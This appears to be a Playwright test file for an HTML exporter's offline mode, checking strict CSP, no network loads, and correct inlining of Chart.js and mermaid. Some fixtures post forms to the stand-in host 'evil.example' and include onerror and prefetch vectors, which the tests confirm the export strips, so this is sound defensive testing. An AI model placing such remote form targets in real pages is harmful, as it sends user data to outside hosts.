      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    const csp = cspMetaContent(exportedHtml);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'unsafe-inline'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
    expect(handlerTag && handlerTag[0]).toBeTruthy();
    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
    expect(exportedHtml).not.toMatch(/@import\s/i);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-zero.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline neutralizes form posts and preserves safe canvas scripts (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_FORMS_AND_CANVAS = `
<h1>Offline forms and canvas</h1>
<p id="form-canvas-note">Network form targets must not survive offline export.</p>
<form id="remoteForm" action="https://evil.example/post">
  <button id="remoteButton" formaction="//evil.example/button">Send</button>
  <input id="remoteInput" formaction="https://evil.example/input" value="Send">
</form>
<div class="cm-skip"><canvas id="customCanvas" width="20" height="20" role="img" aria-label="Custom canvas"></canvas></div>
<script>
(function () {
  window.__benignImportCommentKept = true;
  if (false) import("./local-module.js");
  // This comment has slashes but no network dynamic import.
})();
</script>
<script>
(function () {
  var canvas = document.getElementById("customCanvas");
  var ctx = canvas && canvas.getContext("2d");
  if (!ctx) return;
  ctx.fillStyle = "#ff0000";
  ctx.fillRect(0, 0, 20, 20);
  window.__customCanvasDrew = true;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_FORMS_AND_CANVAS, { key: "cmh-offline-forms-canvas", source: "offline-forms-canvas.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    expect(exportedHtml).toContain("window.__benignImportCommentKept = true");
    expect(exportedHtml).toContain("window.__customCanvasDrew = true");
    for (const id of ["remoteForm", "remoteButton", "remoteInput"]) {
      const tag = exportedHtml.match(new RegExp(`<[^>]+id=["']${id}["'][^>]*>`, "i"));
      expect(tag && tag[0]).toBeTruthy();
      expect(tag[0]).not.toMatch(/\s(?:action|formaction)\s*=/i);
    }

    const exportedPath = path.join(outDir, "offline-forms-canvas.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => ({
      importCommentKept: window.__benignImportCommentKept === true,
      customCanvasDrew: window.__customCanvasDrew === true,
      pixel: Array.from(document.getElementById("customCanvas").getContext("2d").getImageData(1, 1, 1, 1).data),
    }));
    expect(state.importCommentKept).toBe(true);
    expect(state.customCanvasDrew).toBe(true);
    expect(state.pixel.slice(0, 3)).toEqual([255, 0, 0]);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("NonPortable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
  const staged = stageNonPortable({
    mutate: (html) => html.replace(
      /(<main\b[^>]*id="commentRoot"[\s\S]*?<!-- BEGIN: commentable-html - CONTENT[^>]*-->)[\s\S]*?(<!-- END: commentable-html - CONTENT -->)/,
      '$1\n<h1>Region marker prose</h1>\n<pre>\nBEGIN: commentable-html - CSS\n</pre>\n$2'
    ),
  });
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).toMatch(/<pre\b[\s\S]*BEGIN: commentable-html - CSS[\s\S]*<\/pre>/);
    expectForwardCompatibleContract(exportedHtml, "portable");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The offline export replaces the CDN mermaid loader with its own vendored-inline re-init; that
// re-init must carry the same "render hidden diagrams off-screen with mermaid.render()" logic as the
// live loader, so an offline-exported report with a diagram in a collapsed section renders it
// correctly at load (not as a broken zero-size layout), with zero network (CMH-MMD-07).
test("CMH-MMD-07: Export Offline renders a collapsed-section diagram correctly at load with zero network", async ({ page, browser }) => {
  test.setTimeout(60000);
  const CONTENT_COLLAPSED = `
<section><h2>Intro</h2><p id="intro-note">lead-in prose so the content column is wide.</p></section>
<section class="cmh-section-collapsed" id="sec-diagram"><h2>Narrative arc</h2>
<pre class="mermaid cm-skip">flowchart LR
  A["Act 1<br/>The Gap"] --> B["Act 2<br/>Flagship"] --> C["Act 3<br/>Tour"] --> D["Act 4<br/>Dev"] --> E["Act 5<br/>Hood"] --> F["Act 6<br/>Close"]
</pre></section>`;
  const staged = stageContent(CONTENT_COLLAPSED, { key: "cmh-offline-collapsed-mmd", source: "offline-collapsed.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.setViewportSize({ width: 1600, height: 900 });
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");

    const exportedPath = path.join(outDir, "offline-collapsed.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => { if (/^https?:\/\//.test(request.url())) external.push(request.url()); });
    await page2.setViewportSize({ width: 1600, height: 900 });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // The diagram is rendered off-screen at load even though its section stays collapsed, with zero
    // network - so its nodes exist and are correctly laid out without any reveal.
    await expect
      .poll(() => page2.locator("#sec-diagram pre.mermaid svg g.node").count(), { timeout: 20000 })
      .toBe(6);
    const viewBoxWidth = await page2.evaluate(() => {
      const svg = document.querySelector("#sec-diagram pre.mermaid svg");
      const vb = (svg.getAttribute("viewBox") || "").split(/\s+/).map(Number);
      return vb.length === 4 ? vb[2] : 0;
    });
    expect(viewBoxWidth).toBeGreaterThan(400);
    expect(external).toEqual([]);
  } finally {
    await server.close();
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The exporter's chart-canvas selector is deliberately a SUPERSET of what any one renderer draws, so
// the SHAPE of a canvas is not evidence that Chart.js is needed: a canvas carrying
// data-cmh-chart-points / data-cmh-chart-source is drawn by the runtime's own 2D renderer
// (renderInteractiveChart) and never calls Chart.js. Inlining the library for such a document ships
// ~1 MB of dead weight in every offline export (CMH-OFFLINE-06).
const BUILTIN_CHART_CONTENT = `
<h1>Built-in chart</h1>
<p id="builtin-chart-note">This chart is drawn by the built-in renderer, not by Chart.js.</p>
<figure class="chart" aria-labelledby="builtin-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="builtinChart" class="cmh-chart" width="360" height="180" role="img" aria-label="Built-in bar chart"
      data-cmh-chart-points='[{"label":"one","value":4},{"label":"two","value":9},{"label":"three","value":6}]'></canvas>
  </div>
  <figcaption id="builtin-chart-cap">Built-in canvas chart.</figcaption>
</figure>`;

test("CMH-OFFLINE-06: Export Offline omits Chart.js for a document only the built-in renderer draws", async ({ page, browser }) => {
  test.setTimeout(60000);
  const staged = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-builtin-chart", source: "offline-builtin-chart.html" });
  // Seed a library this exporter inlined on an earlier pass, as a re-export of an older offline file
  // carries. It must be removed by its marker (and must not count as evidence that the document
  // needs the library), so the export neither keeps it nor grows a second copy.
  fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(
    "</head>",
    '<script data-cmh-offline-lib="chartjs">window.__staleInlinedLib = true; /* new Chart( */</script>\n</head>'));
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    // The live document draws the chart with the built-in renderer and never defines Chart.
    expect(await page.evaluate(() => typeof window.Chart)).toBe("undefined");
    expect(await page.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return c && c._cmhChart ? c._cmhChart.points.length : 0;
    })).toBe(3);

    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const exportedHtml = await capturedDownloadText(page);

    // No library, and no MIT notice for a library that is not there.
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(exportedHtml).not.toContain("__staleInlinedLib");
    expect(exportedHtml).not.toContain("Third-party notice - Chart.js");
    expect(exportedHtml).not.toContain('data-cmh-offline-lib="mermaid"');
    expect(exportedHtml).not.toContain('id="cmhVendoredRichLibs"');
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-builtin-chart.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    // Never provision less than the renderer draws: the chart still renders, with zero network.
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => {
      const c = document.getElementById("builtinChart");
      return { hasChart: typeof window.Chart !== "undefined", points: c && c._cmhChart ? c._cmhChart.points.length : 0 };
    });
    expect(state.hasChart).toBe(false);
    expect(state.points).toBe(3);
    expect(external).toEqual([]);

    // Re-exporting the offline file stays library-free and does not accumulate a second copy.
    await installDownloadTextCapture(page2);
    await page2.reload();
    await ready(page2);
    await openToolbarMenu(page2);
    await Promise.all([
      page2.waitForEvent("download"),
      page2.locator("#btnExportOfflineTop").click(),
    ]);
    const reExported = await capturedDownloadText(page2);
    expect(reExported).not.toContain('data-cmh-offline-lib="chartjs"');
    expect(reExported).not.toContain("Third-party notice - Chart.js");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("CMH-OFFLINE-06: Export Offline still inlines Chart.js when the document constructs a Chart on a built-in canvas", async ({ page, browser }) => {
  // The superset selector is load-bearing: an author may attach their own Chart.js to ANY canvas,
  // including one that also carries the built-in data attributes. Evidence that the document uses
  // the library must win over the "the built-in renderer draws it" shortcut, or the export would
  // drop a library its own chart needs. The second case pins the INDIRECT construction that a
  // literal `new Chart(` detector would miss.
  test.setTimeout(90000);
  const cases = [
    {
      key: "direct",
      script: `
(function () {
  var el = document.getElementById("builtinChart");
  if (!el || typeof Chart === "undefined") return;
  window.__authorChartBuilt = true;
  new Chart(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
})();`,
    },
    {
      key: "aliased",
      script: `
// Chart bundle: chart.umd.min.js
(function () {
  var el = document.getElementById("builtinChart");
  var C = window.Chart;
  if (!el || !C) return;
  window.__authorChartBuilt = true;
  var chart = new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
  return chart;
})();`,
    },
    {
      key: "module",
      type: ' type="module"',
      script: `
const el = document.getElementById("builtinChart");
const C = window.Chart;
if (el && C) {
  window.__authorChartBuilt = true;
  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ label: "Values", data: [4] }] }, options: { animation: false, responsive: false } });
}`,
    },
  ];
  for (const variant of cases) {
    const content = BUILTIN_CHART_CONTENT
      + '\n<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>\n<script'
      + (variant.type || "") + ">" + variant.script + "\n</script>";
    const staged = stageContent(content, { key: "cmh-offline-author-chart-" + variant.key, source: "offline-author-chart.html" });
    const outDir = makeTmpDir();
    let ctx2;
    try {
      await routeRichContentLocal(page);
      await installDownloadTextCapture(page);
      await page.goto(fileUrl(staged.html));
      await ready(page);
      // A module script is deferred, so wait for the author chart rather than sampling once.
      await page.waitForFunction(() => window.__authorChartBuilt === true);

      await openToolbarMenu(page);
      await Promise.all([
        page.waitForEvent("download"),
        page.locator("#btnExportOfflineTop").click(),
      ]);
      const exportedHtml = await capturedDownloadText(page);
      expect(exportedHtml, `${variant.key}: Chart.js inlined`).toContain('data-cmh-offline-lib="chartjs"');
      expect(exportedHtml, `${variant.key}: MIT notice travels with it`).toContain("Third-party notice - Chart.js");
      expect(networkLoadRefs(exportedHtml)).toEqual([]);

      // The library must be inlined BEFORE the constructing script runs, so prove it by reopening
      // the export offline rather than by asserting the marker alone.
      const exportedPath = path.join(outDir, "offline-author-chart.html");
      fs.writeFileSync(exportedPath, exportedHtml);
      ctx2 = await browser.newContext();
      const page2 = await ctx2.newPage();
      const external = [];
      await page2.route(/^https?:\/\//, async (route) => {
        external.push(route.request().url());
        await route.abort();
      });
      // addInitScript only applies to navigations that follow it, so install before the goto.
      await installDownloadTextCapture(page2);
      await page2.goto(fileUrl(exportedPath));
      await ready(page2);
      await page2.waitForFunction(() => window.__authorChartBuilt === true);
      expect(await page2.evaluate(() => typeof window.Chart !== "undefined"),
        `${variant.key}: Chart global present offline`).toBe(true);
      expect(external).toEqual([]);
    } finally {
      if (ctx2) await ctx2.close();
      fs.rmSync(staged.dir, { recursive: true, force: true });
      fs.rmSync(outDir, { recursive: true, force: true });
    }
  }
});

test("CMH-OFFLINE-06: evidence covers a head-placed legacy-typed constructor and unusable built-in data", async ({ page, browser }) => {
  // Two branches that a shape-only or literal-constructor detector would miss: a constructing script
  // in the HEAD (which must be hoisted below the inlined library or it runs first) declared with a
  // legacy but still-executable script type, and a canvas whose built-in data cannot draw anything,
  // so the built-in renderer is NOT what covers it.
  test.setTimeout(90000);
  const outDir = makeTmpDir();
  const stagedHead = stageContent(BUILTIN_CHART_CONTENT, { key: "cmh-offline-head-ctor", source: "offline-head-ctor.html" });
  const emptyData = BUILTIN_CHART_CONTENT.replace(/data-cmh-chart-points='[^']*'/, "data-cmh-chart-points=''");
  const stagedEmpty = stageContent(emptyData, { key: "cmh-offline-empty-data", source: "offline-empty-data.html" });
  let ctx2;
  try {
    expect(emptyData).toContain("data-cmh-chart-points=''");
    fs.writeFileSync(stagedHead.html, fs.readFileSync(stagedHead.html, "utf8").replace(
      "</head>",
      '<script type="text/ecmascript">\nwindow.addEventListener("DOMContentLoaded", function () {\n'
      + '  var el = document.getElementById("builtinChart");\n  var C = window.Chart;\n'
      + '  if (!el || !C) return;\n  window.__headChartBuilt = true;\n'
      + '  new C(el, { type: "bar", data: { labels: ["one"], datasets: [{ data: [4] }] }, options: { animation: false, responsive: false } });\n'
      + "});\n</script>\n</head>"));

    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(stagedHead.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    const headExport = await capturedDownloadText(page);
    expect(headExport, "a legacy-typed head constructor is evidence").toContain('data-cmh-offline-lib="chartjs"');
    const exportedPath = path.join(outDir, "offline-head-ctor.html");
    fs.writeFileSync(exportedPath, headExport);
    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await page2.waitForFunction(() => window.__headChartBuilt === true);
    expect(external).toEqual([]);

    // A canvas whose inline data cannot produce a point is not one the built-in renderer draws, so
    // the library still travels rather than leaving the canvas blank.
    await page.goto(fileUrl(stagedEmpty.html));
    await ready(page);
    await openToolbarMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(await capturedDownloadText(page), "unusable built-in data still provisions the library")
      .toContain('data-cmh-offline-lib="chartjs"');
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(stagedHead.dir, { recursive: true, force: true });
    fs.rmSync(stagedEmpty.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline fails loudly when a rich document has no vendored payload (CMH-SIZE-01)", async ({ page }) => {
  // The payload is now stripped from documents that do not use rich content (CMH-SIZE-01). The
  // hazard that creates is the OTHER direction: a document that DOES use mermaid or a chart but
  // whose payload is absent - a hand-edited or legacy file. It must fail visibly rather than
  // silently downloading an export whose diagrams and charts will never render.
  test.setTimeout(60000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-nopayload", source: "offline-nopayload.html" });
  const before = fs.readFileSync(staged.html, "utf8");
  // Cut the payload out by INDEX rather than with a replace() pattern. This is a test fixture
  // removing one known element, not a sanitizer, and a regex here reads to CodeQL as an
  // incomplete multi-character sanitization.
  const idAt = before.indexOf('id="cmhVendoredRichLibs"');
  expect(idAt).toBeGreaterThan(-1);
  const openAt = before.lastIndexOf("<script", idAt);
  const closeAt = before.indexOf("</script>", idAt);
  expect(openAt).toBeGreaterThan(-1);
  expect(closeAt).toBeGreaterThan(openAt);
  const stripped = before.slice(0, openAt) + before.slice(closeAt + "</script>".length);
  expect(stripped.length).toBeLessThan(before.length - 1000000);
  expect(stripped).not.toContain('id="cmhVendoredRichLibs">{"encoding"');
  fs.writeFileSync(staged.html, stripped);

  const server = await startStaticServer(staged.dir);
  try {
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);

    // Use the TOOLBAR export entry: the sidebar menu only appears once a comment exists, and
    // this document needs no comments to reproduce the failure.
    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    const downloads = [];
    page.on("download", (d) => downloads.push(d));
    await page.locator("#btnExportOfflineTop").click();

    // A visible, assertive error naming the missing bundle - not a silent broken download.
    const toast = page.locator("#toast");
    await expect(toast).toContainText(/missing the vendored/i, { timeout: 15000 });
    await expect(toast).toBeVisible();
    expect(downloads).toHaveLength(0);
  } finally {
    await server.close();
  }
});
